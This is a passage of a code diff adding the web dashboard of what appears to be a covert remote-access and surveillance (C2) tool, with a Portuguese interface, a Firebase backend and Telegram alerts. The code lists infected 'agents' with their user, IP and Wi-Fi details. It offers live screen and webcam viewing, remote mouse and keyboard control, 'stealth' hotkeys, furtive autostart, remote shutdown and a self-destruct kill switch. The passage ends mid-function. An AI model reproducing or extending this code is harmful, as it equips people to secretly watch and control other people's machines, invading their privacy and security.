+                            <input type="text" id="mod_app_pw" class="mt-1 w-full bg-slate-950 border border-slate-700 rounded p-2.5 text-white text-xs" placeholder="Ex: 1234">
+                        </label>
+                        <label class="col-span-1 sm:col-span-2 relative inline-flex items-center cursor-pointer mt-1 mb-1">
+                            <input type="checkbox" id="mod_local_lock" class="sr-only peer">
+                            <div class="w-11 h-6 bg-red-500 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-sky-500"></div>
+                            <span class="ml-3 text-[11px] sm:text-xs font-bold text-sky-400">Bloquear Interface Local do Agente</span>
+                        </label>
+                        <div class="col-span-1 sm:col-span-2 border-b border-slate-800 my-0 sm:my-1"></div>
+
+                        <label class="flex flex-col">
+                            <span class="text-fuchsia-400 font-semibold text-xs mb-1">Qualidade Fotos (1-100):</span>
+                            <input type="number" id="mod_photo_quality" class="mt-1 w-full bg-slate-950 border border-slate-700 rounded p-2.5 text-fuchsia-400 text-xs">
+                        </label>
+                        <label class="flex flex-col">
+                            <span class="text-fuchsia-400 font-semibold text-xs mb-1">Resolução Fotos (%):</span>
+                            <input type="number" id="mod_photo_resolution" class="mt-1 w-full bg-slate-950 border border-slate-700 rounded p-2.5 text-fuchsia-400 text-xs">
+                        </label>
+
+                        <label class="flex flex-col mt-1 sm:mt-2">
+                            <span class="text-xs mb-1 text-gray-400">Intervalo Sync (min):</span>
+                            <input type="number" id="mod_sync" class="mt-1 w-full bg-slate-950 border border-slate-700 rounded p-2.5 text-white text-xs">
+                        </label>
+                        <label class="flex flex-col mt-1 sm:mt-2">
+                            <span class="text-xs mb-1 text-gray-400">Limite Fotos Batch:</span>
+                            <input type="number" id="mod_photos" class="mt-1 w-full bg-slate-950 border border-slate-700 rounded p-2.5 text-white text-xs">
+                        </label>
+                        
+                        <label class="col-span-1 sm:col-span-2 flex flex-col hidden">
+                            <input type="number" id="mod_port" value="5555">
+                        </label>
+                        
+                        <label class="col-span-1 sm:col-span-2 flex flex-col mt-2">
+                            <span class="text-amber-400 text-xs mb-1">Atalho Stealth Local:</span>
+                            <div class="flex items-center gap-2 mt-1">
+                                <input type="text" id="mod_hk" class="w-full bg-slate-950 border border-slate-700 rounded p-2.5 text-amber-400 font-mono text-xs" readonly>
+                                <button type="button" id="btn_record_hk" onclick="toggleHotkeyRecording()" class="bg-slate-800 hover:bg-slate-700 text-white px-4 py-2.5 rounded-lg text-xs font-bold transition-colors border border-slate-700 shrink-0">Gravar</button>
+                            </div>
+                        </label>
+                        
+                        <label class="col-span-1 sm:col-span-2 relative inline-flex items-center cursor-pointer mt-3">
+                            <input type="checkbox" id="mod_auto" class="sr-only peer" checked>
+                            <div class="w-11 h-6 bg-red-500 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-amber-500"></div>
+                            <span class="ml-3 text-[11px] sm:text-xs font-bold text-amber-400">Arranque Automático Furtivo</span>
+                        </label>
+                    </div>
+                </details>
+            </div>
+            
+            <div class="flex flex-col-reverse sm:flex-row justify-end gap-2 sm:gap-3 mt-4 border-t border-slate-800 pt-4 shrink-0">
+                <button onclick="closeModal('config-modal')" class="w-full sm:w-auto px-4 py-3 sm:py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-white text-xs font-bold transition-colors">Cancelar</button>
+                <button onclick="pushRemoteConfig()" class="w-full sm:w-auto px-5 py-3 sm:py-2.5 rounded-xl bg-sky-600 hover:bg-sky-500 text-white font-bold transition-colors shadow-[0_0_15px_rgba(2,132,199,0.3)] text-sm sm:text-xs active:scale-95">Gravar & Injetar C2</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let FB_URL = localStorage.getItem('fb_url') || '';
+        let FB_SECRET = localStorage.getItem('fb_secret') || '';
+        let currentTargetId = '';
+        let refreshInterval;
+        let currentStreamTarget = '';
+        let currentStreamUrl = '';
+        
+        let isRecordingHotkey = false;
+        let recordedKeys = new Set();
+        let globalAdminConfig = {}; 
+        
+        let expandedClients = new Set(); 
+        window.clientsCache = {};
+
+        async function testTelegramWeb(tokenId, chatId) {
+            const token = document.getElementById(tokenId).value.trim();
+            const chat = document.getElementById(chatId).value.trim();
+            
+            if (!token || !chat) {
+                alert("Por favor, preencha o Bot Token e o Chat ID para testar.");
+                return;
+            }
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const payload = {
+                chat_id: chat,
+                text: "✅ *Teste do Painel Web: Bem Sucedido!*\nO seu bot está a receber comandos.",
+                parse_mode: "Markdown"
+            };
+
+            try {
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (res.ok) {
+                    alert("Sucesso! Verifique a mensagem no seu Telegram.");
+                } else {
+                    alert(`Falha no teste. Código de erro: ${res.status}. Verifique se o Token e o Chat ID estão corretos.`);
+                }
+            } catch (err) {
+                alert("Erro de rede ao tentar contactar a API do Telegram.");
+            }
+        }
+
+        if (FB_URL) {
+            document.getElementById('fb-url').value = FB_URL;
+            document.getElementById('fb-secret').value = FB_SECRET;
+            connectFirebase();
+        }
+
+        async function connectFirebase() {
+            FB_URL = document.getElementById('fb-url').value.trim();
+            FB_SECRET = document.getElementById('fb-secret').value.trim();
+            if (!FB_URL) { alert("Insira a URL do Firebase!"); return; }
+            if (!FB_URL.endsWith('/')) FB_URL += '/';
+
+            localStorage.setItem('fb_url', FB_URL);
+            localStorage.setItem('fb_secret', FB_SECRET);
+
+            try {
+                let reqUrl = `${FB_URL}admin_config.json`;
+                if (FB_SECRET) reqUrl += `?auth=${FB_SECRET}`;
+                
+                const res = await fetch(reqUrl);
+                if (!res.ok) throw new Error("Erro de Autenticação/Permissão");
+                globalAdminConfig = await res.json() || {};
+
+                document.getElementById('setup-screen').classList.add('hidden');
+                
+                if (globalAdminConfig.web_password) {
+                    if (sessionStorage.getItem('is_logged_in') === 'true') {
+                        startDashboard();
+                    } else {
+                        document.getElementById('login-screen').classList.remove('hidden');
+                        document.getElementById('login-screen').classList.add('flex');
+                        document.getElementById('master-password').focus();
+                    }
+                } else {
+                    document.getElementById('create-password-screen').classList.remove('hidden');
+                    document.getElementById('create-password-screen').classList.add('flex');
+                }
+            } catch (err) {
+                alert("Falha ao comunicar com o Firebase. Verifique a URL e o Secret.");
+            }
+        }
+
+        async function saveNewWebPassword() {
+            const pw = document.getElementById('new-web-password').value.trim();
+            const tgToken = document.getElementById('new-tg-token').value.trim();
+            const tgChat = document.getElementById('new-tg-chat').value.trim();
+
+            if(!pw || pw.length < 4) { alert("A senha é obrigatória e deve ter pelo menos 4 caracteres!"); return; }
+
+            const payload = {
+                web_password: pw,
+                use_tg: (tgToken && tgChat) ? true : false,
+                tg_token: tgToken,
+                tg_chat: tgChat,
+                tg_hashtag: '#C2_RECUPERACAO'
+            };
+
+            let reqUrl = `${FB_URL}admin_config.json`;
+            if (FB_SECRET) reqUrl += `?auth=${FB_SECRET}`;
+
+            try {
+                await fetch(reqUrl, { method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                globalAdminConfig = payload;
+                sessionStorage.setItem('is_logged_in', 'true');
+                document.getElementById('create-password-screen').classList.add('hidden');
+                document.getElementById('create-password-screen').classList.remove('flex');
+                startDashboard();
+            } catch(e) { alert('Erro ao guardar a configuração inicial no Firebase.'); }
+        }
+
+        function loginDashboard() {
+            const inputPw = document.getElementById('master-password').value;
+            if (inputPw === globalAdminConfig.web_password) {
+                sessionStorage.setItem('is_logged_in', 'true');
+                document.getElementById('login-screen').classList.add('hidden');
+                document.getElementById('login-screen').classList.remove('flex');
+                startDashboard();
+            } else {
+                alert("Acesso Negado! Senha Incorreta.");
+                document.getElementById('master-password').value = "";
+            }
+        }
+
+        async function recoverPassword() {
+            if (!globalAdminConfig.use_tg || !globalAdminConfig.tg_token || !globalAdminConfig.tg_chat) {
+                alert("O Bot do Telegram não está configurado."); return;
+            }
+            const btn = document.getElementById('btn-recover');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = "A enviar...";
+
+            const hashtag = globalAdminConfig.tg_hashtag || '#C2_RECUPERACAO';
+            const msg = `🚨 *RECUPERAÇÃO DE ACESSO C2* 🚨\n\n🔑 Senha Mestra: \`${globalAdminConfig.web_password}\`\n\n${hashtag}`;
+            const url = `https://api.telegram.org/bot${globalAdminConfig.tg_token}/sendMessage`;
+
+            try {
+                await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: globalAdminConfig.tg_chat, text: msg, parse_mode: 'Markdown' }) });
+                btn.innerHTML = "<span class='text-emerald-500 font-bold'>✓ Enviada!</span>";
+            } catch (e) { btn.innerHTML = originalText; }
+            setTimeout(() => { btn.innerHTML = originalText; }, 4000);
+        }
+
+        function startDashboard() {
+            document.getElementById('dashboard-screen').classList.remove('hidden');
+            document.getElementById('dashboard-screen').classList.add('flex');
+            fetchClients();
+            refreshInterval = setInterval(fetchClients, 10000);
+        }
+
+        function lockPanel() {
+            clearInterval(refreshInterval);
+            sessionStorage.removeItem('is_logged_in'); 
+            document.getElementById('master-password').value = "";
+            document.getElementById('dashboard-screen').classList.add('hidden');
+            document.getElementById('dashboard-screen').classList.remove('flex');
+            document.getElementById('login-screen').classList.remove('hidden');
+            document.getElementById('login-screen').classList.add('flex');
+        }
+
+        function logout() {
+            lockPanel();
+            localStorage.removeItem('fb_secret');
+            document.getElementById('login-screen').classList.add('hidden');
+            document.getElementById('login-screen').classList.remove('flex');
+            document.getElementById('setup-screen').classList.remove('hidden');
+            document.getElementById('setup-screen').classList.add('flex');
+        }
+
+        function openGlobalConfig() {
+            document.getElementById('admin-current-pw').value = '';
+            document.getElementById('admin-new-pw').value = '';
+            document.getElementById('admin-tg-hashtag').value = globalAdminConfig.tg_hashtag || '#C2_RECUPERACAO';
+            document.getElementById('admin-panel-url').value = globalAdminConfig.panel_url || '';
+            document.getElementById('global-config-modal').classList.remove('hidden');
+        }
+
+        async function updateGlobalAdminConfig() {
+            const currentPw = document.getElementById('admin-current-pw').value;
+            const newPw = document.getElementById('admin-new-pw').value.trim();
+            const panelUrl = document.getElementById('admin-panel-url').value.trim();
+            let newHashtag = document.getElementById('admin-tg-hashtag').value.trim() || '#C2_RECUPERACAO';
+            if (!newHashtag.startsWith('#')) newHashtag = '#' + newHashtag;
+
+            const payloadToUpdate = { 
+                tg_hashtag: newHashtag,
+                panel_url: panelUrl
+            };
+            
+            // SOMENTE EXIGE SENHA ATUAL SE O USUÁRIO TENTAR DEFINIR UMA "NOVA SENHA"
+            if (newPw) {
+                if (currentPw !== globalAdminConfig.web_password) { 
+                    alert("Erro: Para definir uma Nova Senha, você precisa digitar a Senha Atual corretamente!"); 
+                    return; 
+                }
+                if (newPw.length < 4) { 
+                    alert("A Nova Senha deve ter no mínimo 4 caracteres!"); 
+                    return; 
+                }
+                payloadToUpdate.web_password = newPw;
+            }
+
+            let reqUrl = `${FB_URL}admin_config.json`;
+            if (FB_SECRET) reqUrl += `?auth=${FB_SECRET}`;
+
+            try {
+                await fetch(reqUrl, { method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payloadToUpdate) });
+                if (newPw) globalAdminConfig.web_password = newPw;
+                globalAdminConfig.tg_hashtag = newHashtag;
+                globalAdminConfig.panel_url = panelUrl;
+                alert("Configurações atualizadas com sucesso!");
+                closeModal('global-config-modal');
+            } catch(e) { alert("Erro ao guardar as configurações."); }
+        }
+
+        function updateStreamModalUI() {
+            if(!currentStreamTarget) return;
+            const clientData = window.clientsCache[currentStreamTarget] || {};
+            const camActive = clientData.stream_url?.cam_active || false;
+            const streamUrl = clientData.stream_url?.url || "";
+            const hasStream = !!streamUrl;
+
+            currentStreamUrl = streamUrl;
+
+            // Logica Botão Tela
+            const btnScreen = document.getElementById('modal-btn-screen');
+            if(hasStream && !camActive) {
+                btnScreen.innerHTML = `<svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg> Parar Tela`;
+                btnScreen.className = "bg-rose-600/80 hover:bg-rose-600 text-white px-4 py-2.5 rounded-xl text-[10px] sm:text-xs font-bold transition-all border border-rose-500/50 shadow-[0_0_10px_rgba(225,29,72,0.4)] flex items-center gap-2 active:scale-95";
+                btnScreen.onclick = () => sendStreamCommand(currentStreamTarget, 'stop_stream', btnScreen);
+            } else {
+                btnScreen.innerHTML = `<svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg> Ligar Tela HD`;
+                btnScreen.className = "bg-sky-600/80 hover:bg-sky-600 text-white px-4 py-2.5 rounded-xl text-[10px] sm:text-xs font-bold transition-all border border-sky-500/50 shadow-[0_0_10px_rgba(2,132,199,0.4)] flex items-center gap-2 active:scale-95";
+                btnScreen.onclick = () => sendStreamCommand(currentStreamTarget, 'stream', btnScreen);
+            }
+
+            // Logica Botão Câmera
+            const btnCam = document.getElementById('modal-btn-cam');
+            if(camActive) {
+                btnCam.innerHTML = `<svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M23 7l-7 5 7 5V7z"></path><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg> Desligar Câmera`;
+                btnCam.className = "bg-rose-900/80 hover:bg-rose-600 text-rose-300 hover:text-white px-4 py-2.5 rounded-xl text-[10px] sm:text-xs font-bold transition-all border border-rose-800/50 flex items-center gap-2 active:scale-95";
+                btnCam.onclick = () => sendCommand(currentStreamTarget, 'stop_cam', btnCam);
+            } else {
+                btnCam.innerHTML = `<svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M23 7l-7 5 7 5V7z"></path><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg> Ligar Câmera`;
+                btnCam.className = "bg-teal-900/80 hover:bg-teal-600 text-teal-300 hover:text-white px-4 py-2.5 rounded-xl text-[10px] sm:text-xs font-bold transition-all border border-teal-800/50 flex items-center gap-2 active:scale-95";
+                btnCam.onclick = () => sendCommand(currentStreamTarget, 'start_cam', btnCam);
+            }
+
+            // Atualizar a imagem
+            const img = document.getElementById('live-stream-img');
+            const status = document.getElementById('stream-status');
+            
+            if(streamUrl && img.getAttribute('src') !== streamUrl) {
+                img.setAttribute('src', streamUrl);
+                status.innerText = "A conectar ao túnel HD...";
+                img.onload = () => { status.innerText = ""; };
+            } else if (!streamUrl && img.getAttribute('src')) {
+                img.removeAttribute('src');
+                status.innerText = "Transmissão Inativa. Utilize os botões abaixo.";
+            }
+
+            // Atualizar o Titulo do Modal
+            document.getElementById('stream-type-text').innerText = camActive ? "Câmera ao Vivo" : (hasStream ? "Transmissão HD (Tela)" : "Painel de Visualização");
+        }
+
+        async function fetchClients() {
+            document.getElementById('refresh-loader').classList.remove('hidden');
+            let reqUrl = `${FB_URL}clients.json`;
+            if (FB_SECRET) reqUrl += `?auth=${FB_SECRET}`;
+
+            try {
+                const res = await fetch(reqUrl);
+                if (!res.ok) throw new Error("Erro");
+                const data = await res.json();
+                window.clientsCache = data || {}; 
+                renderClients(window.clientsCache);
+                
+                // Atualiza o modal de Stream se estiver aberto
+                if(currentStreamTarget) {
+                    updateStreamModalUI();
+                }
+            } catch (err) {}
+            
+            const now = new Date();
+            document.getElementById('last-update').innerText = `Atualizado: ${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
+            document.getElementById('refresh-loader').classList.add('hidden');
+        }
+
+        function toggleClientCard(clientId) {
+            if (window.innerWidth >= 768) return;
+            if (expandedClients.has(clientId)) {
+                expandedClients.delete(clientId);
+            } else {
+                expandedClients.clear(); 
+                expandedClients.add(clientId);
+            }
+            if(window.clientsCache) { renderClients(window.clientsCache); }
+        }
+
+        function renderClients(clientsObj) {
+            const grid = document.getElementById('machines-grid');
+            let finalHtml = '';
+            
+            let total = 0, online = 0, offline = 0;
+            const nowTime = new Date().getTime();
+
+            for (const [clientId, clientData] of Object.entries(clientsObj)) {
+                if(clientId === "admin_config") continue; 
+                
+                // NOVO LÓGICA KILL SWITCH: Pula agentes destruídos e limpa se página for recarregada
+                if(clientData && clientData.killedAt) {
+                    const killedTime = parseInt(clientData.killedAt);
+                    if (Date.now() - killedTime > 180000) {
+                        // Passados os 3 minutos da destruição, elimina mesmo o nó da base de dados.
+                        let deleteUrl = `${FB_URL}clients/${clientId}.json?auth=${FB_SECRET}`;
+                        fetch(deleteUrl, { method: 'DELETE' }).catch(()=>{});
+                    }
+                    continue; // Pula este agente, não mostrando mais o "card"
+                }
+
+                const safeId = clientId.replace(/[^a-zA-Z0-9]/g, '_');
+                const escClientId = clientId.replace(/'/g, "\\'");
+
+                total++;
+                let isOnline = false;
+                
+                if (clientData.status && clientData.status.last_seen) {
+                    const lastSeenTime = new Date(clientData.status.last_seen).getTime();
+                    if (nowTime - lastSeenTime < 150000) { isOnline = true; online++; } 
+                    else { offline++; }
+                } else { offline++; }
+
+                const statusHtml = isOnline 
+                    ? `<div class="flex items-center gap-1.5"><div class="w-2.5 h-2.5 rounded-full bg-emerald-500 shadow-[0_0_8px_#10b981]"></div><span class="text-[10px] sm:text-xs text-emerald-500 font-bold uppercase tracking-wider">Online</span></div>`
+                    : `<div class="flex items-center gap-1.5"><div class="w-2.5 h-2.5 rounded-full bg-rose-600"></div><span class="text-[10px] sm:text-xs text-rose-500 font-bold uppercase tracking-wider">Offline</span></div>`;
+
+                const ip = clientData.status?.ip || 'Desconhecido';
+                const os = clientData.status?.os || 'Desconhecido';
+                const user = clientData.status?.user || 'Desconhecido';
+                const displayName = clientData.status?.custom_name || clientId;
+                const escDisplayName = displayName.replace(/'/g, "\\'");
+                
+                let lastSeenStr = "Nunca";
+                if(clientData.status?.last_seen) {
+                    let d = new Date(clientData.status.last_seen);
+                    lastSeenStr = `${d.getHours().toString().padStart(2,'0')}:${d.getMinutes().toString().padStart(2,'0')} - ${d.getDate()}/${d.getMonth()+1}`;
+                }
+
+                let streamUrl = "";
+                let hasStream = false;
+                if(clientData.stream_url && clientData.stream_url.url) {
+                     streamUrl = clientData.stream_url.url;
+                     hasStream = true;
+                }
+
+                const camAvailable = clientData.status?.cam_available || false;
+                const camActive = clientData.stream_url?.cam_active || false;
+
+                const battery = clientData.status?.battery || 'N/A';
+                const wifi = clientData.status?.wifi || 'N/A';
+                
+                let batteryColor = 'text-amber-400';
+                if(battery.includes('AC') || battery === 'Desktop/AC') batteryColor = 'text-emerald-400';
+                else if(parseInt(battery) <= 20) batteryColor = 'text-rose-500 animate-pulse';
+
+                const isExpanded = expandedClients.has(clientId);
+                const detailsDisplayClass = isExpanded ? '' : 'hidden md:block';
+                const chevronRotationClass = isExpanded ? 'rotate-180' : '';
+
+                finalHtml += `
+                    <div class="glass p-4 sm:p-5 rounded-2xl border border-slate-800 hover:border-slate-700 transition-colors flex flex-col relative overflow-hidden">
+                        
+                        <div onclick="toggleClientCard('${escClientId}')" class="flex justify-between items-center cursor-pointer md:cursor-default select-none group md:mb-4 md:pb-3 md:border-b md:border-slate-800">
+                            <div class="flex-1 truncate pr-2">
+                                <h3 class="text-sm sm:text-base font-bold text-white flex items-center gap-1.5 truncate" title="ID Original: ${clientId}">
+                                    <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" class="text-sky-500 flex-shrink-0 sm:w-4 sm:h-4"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+                                    ${displayName}
+                                </h3>
+                                <p class="text-[9px] sm:text-[10px] text-slate-400 mt-1 truncate">${user} @ ${ip}</p>
+                            </div>
+                            <div class="flex items-center gap-2 sm:gap-3 shrink-0">
+                                ${statusHtml}
+                                <div class="bg-slate-800/50 group-hover:bg-slate-700 p-1.5 rounded-lg ml-1 transition-colors md:hidden">
+                                    <svg class="w-4 h-4 text-slate-400 transition-transform duration-300 ${chevronRotationClass}" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- BODY -->
+                        <div class="${detailsDisplayClass} mt-4 pt-4 border-t border-slate-800 md:mt-0 md:pt-0 md:border-t-0">
+                            <div class="grid grid-cols-2 gap-2 mb-4 text-[10px] sm:text-xs">
+                                <div class="bg-slate-900/50 p-2 rounded border border-slate-800 col-span-2 flex justify-between items-center">
+                                    <div>
+                                        <span class="text-slate-500 block mb-0.5 sm:mb-1">Última Atividade C2</span>
+                                        <span class="text-amber-400 font-mono">${lastSeenStr}</span>
+                                    </div>
+                                    <div class="text-right">
+                                        <span class="text-slate-500 block mb-0.5 sm:mb-1">Energia</span>
+                                        <span class="${batteryColor} font-bold flex items-center justify-end gap-1">
+                                            <svg width="12" height="12" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16.7 8a3 3 0 0 0-2.7-2h-4a3 3 0 0 0-3 3v6a3 3 0 0 0 3 3h4a3 3 0 0 0 2.7-2M19 15v-6M12 15l-2-3h4l-2-3"></path></svg>
+                                            ${battery}
+                                        </span>
+                                    </div>
+                                </div>
+                                <div class="bg-slate-900/50 p-2 rounded border border-slate-800">
+                                    <span class="text-slate-500 block mb-0.5 sm:mb-1">Sistema</span>
+                                    <span class="text-sky-300 truncate block" title="${os}">${os.split(' ')[0]}</span>
+                                </div>
+                                <div class="bg-slate-900/50 p-2 rounded border border-slate-800">
+                                    <span class="text-slate-500 block mb-0.5 sm:mb-1">Rede Wi-Fi</span>
+                                    <span class="text-indigo-400 truncate block font-bold flex items-center gap-1" title="${wifi}">
+                                        <svg width="12" height="12" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M5 12.55a11 11 0 0 1 14.08 0M1.42 9a16 16 0 0 1 21.16 0M8.53 16.11a6 6 0 0 1 6.95 0M12 20h.01"></path></svg>
+                                        ${wifi}
+                                    </span>
+                                </div>
+                            </div>
+
+                            <div class="space-y-2">
+                                <div class="grid grid-cols-2 gap-2 border-b border-slate-800 pb-2 mb-2">
+                                    <button onclick="sendCommand('${escClientId}', 'start_protocol', this)" class="bg-emerald-900/40 hover:bg-emerald-600 text-emerald-400 hover:text-white border border-emerald-900/50 py-2 sm:py-1.5 rounded-lg text-[10px] sm:text-xs font-bold transition-colors active:scale-95">▶ Monitorar</button>
+                                    <button onclick="sendCommand('${escClientId}', 'stop_protocol', this)" class="bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white border border-slate-700 py-2 sm:py-1.5 rounded-lg text-[10px] sm:text-xs font-bold transition-colors active:scale-95">⏸ Pausar</button>
+                                </div>
+                                
+                                <div class="w-full mb-2">
+                                    <button onclick="openStreamModal('${escClientId}')" class="w-full bg-sky-600/20 hover:bg-sky-600 text-sky-400 hover:text-white border border-sky-600/30 py-2.5 sm:py-3 rounded-lg text-[10px] sm:text-xs font-bold transition-colors shadow-[0_0_10px_rgba(2,132,199,0.1)] active:scale-95 flex items-center justify-center gap-2">
+                                        <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14v-4z"></path><rect x="3" y="6" width="12" height="12" rx="2" ry="2"></rect></svg>
+                                        Assistir ao Vivo
+                                    </button>
+                                </div>
+
+                                <button onclick="openConfigModal('${escClientId}', '${escDisplayName}')" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 py-2.5 sm:py-2 rounded-lg text-[10px] sm:text-xs font-bold transition-colors active:scale-95 flex items-center justify-center gap-2">
+                                    <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06-.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>
+                                    Configurações C2
+                                </button>
+                                
+                                <div class="mt-2 border-t border-slate-800 pt-2">
+                                    <button onclick="if(confirm('Deseja REINICIAR O PC INTEIRO da máquina ${escDisplayName}?')) sendCommand('${escClientId}', 'restart_pc', this)" class="w-full bg-indigo-900/60 hover:bg-indigo-600 text-white py-2.5 sm:py-2 rounded-lg text-[10px] font-bold uppercase border border-indigo-900/80 active:scale-95 flex items-center justify-center gap-1">
+                                        <svg width="12" height="12" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="23 4 23 10 17 10"></polyline><polyline points="1 20 1 14 7 14"></polyline><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path></svg> 
+                                        Reiniciar PC
+                                    </button>
+                                </div>
+
+                                <div class="grid grid-cols-2 gap-2 mt-2">
+                                    <button onclick="if(confirm('Deseja realmente DESLIGAR a máquina ${escDisplayName}?')) sendCommand('${escClientId}', 'shutdown', this)" class="bg-orange-900/60 hover:bg-orange-600 text-white py-2.5 sm:py-2 rounded-lg text-[10px] font-bold uppercase border border-orange-900/80 active:scale-95">Desligar</button>
+                                    <button onclick="if(confirm('ATENÇÃO: Deseja ELIMINAR O AGENTE (AUTODESTRUIÇÃO) da máquina ${escDisplayName}?!')) sendCommand('${escClientId}', 'kill', this)" class="bg-red-900/80 hover:bg-red-500 text-white py-2.5 sm:py-2 rounded-lg text-[10px] font-bold shadow-[0_0_10px_rgba(255,0,0,0.5)] uppercase border border-red-800/80 active:scale-95">Kill Switch</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }
+
+            grid.innerHTML = finalHtml;
+
+            document.getElementById('stat-total').innerText = total;
+            document.getElementById('stat-online').innerText = online;
+            document.getElementById('stat-offline').innerText = offline;
+
+            if (total === 0) {
+                grid.innerHTML = `<div class="col-span-full flex flex-col items-center justify-center p-8 sm:p-12 text-slate-500 border border-dashed border-slate-800 rounded-2xl"><svg width="40" height="40" class="sm:w-12 sm:h-12" fill="none" stroke="currentColor" stroke-width="1.5" class="mb-4"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg><p class="text-xs sm:text-base mt-4 text-center">Nenhum Agente C2 a comunicar com o Firebase.</p></div>`;
+            }
+        }
+
+        // === CONTROLO ANYDESK E ZOOM/PAN ===
+        const streamContainerInner = document.getElementById('stream-container-inner');
+        const streamImg = document.getElementById('live-stream-img');
+        let zoomScale = 1;
+        let panPos = { x: 0, y: 0 };
+        let startPanPos = { x: 0, y: 0 };
+        let lastTouchDist = 0;
+        let isDragging = false;
+        
+        let controlMode = false;
+        let keyboardControlMode = false;
+        let lastMoveTime = 0;
+        let moveAbortController = null;
+
+        function toggleControlMode() {
+            controlMode = !controlMode;
+            const btn = document.getElementById('btn-control-mode');
+            if (controlMode) {
+                btn.classList.add('bg-emerald-600');
+                btn.classList.remove('bg-slate-800/80');
+                streamImg.classList.add('cursor-crosshair');
+                resetStreamZoom(); 
+            } else {
+                btn.classList.remove('bg-emerald-600');
+                btn.classList.add('bg-slate-800/80');
+                streamImg.classList.remove('cursor-crosshair');
+            }
+        }
+
+        function toggleKeyboardMode() {
+            keyboardControlMode = !keyboardControlMode;
+            const btn = document.getElementById('btn-keyboard-mode');
+            if (keyboardControlMode) {
+                btn.classList.add('bg-indigo-600'); 
+                btn.classList.remove('bg-slate-800/80');
+                streamContainerInner.focus(); 
+            } else {
+                btn.classList.remove('bg-indigo-600');
+                btn.classList.add('bg-slate-800/80');
+                streamContainerInner.blur();
+            }
+        }
+
+        function getRelativeCoords(event) {
+            const rect = streamImg.getBoundingClientRect();
+            const imgRatio = streamImg.naturalWidth / streamImg.naturalHeight;
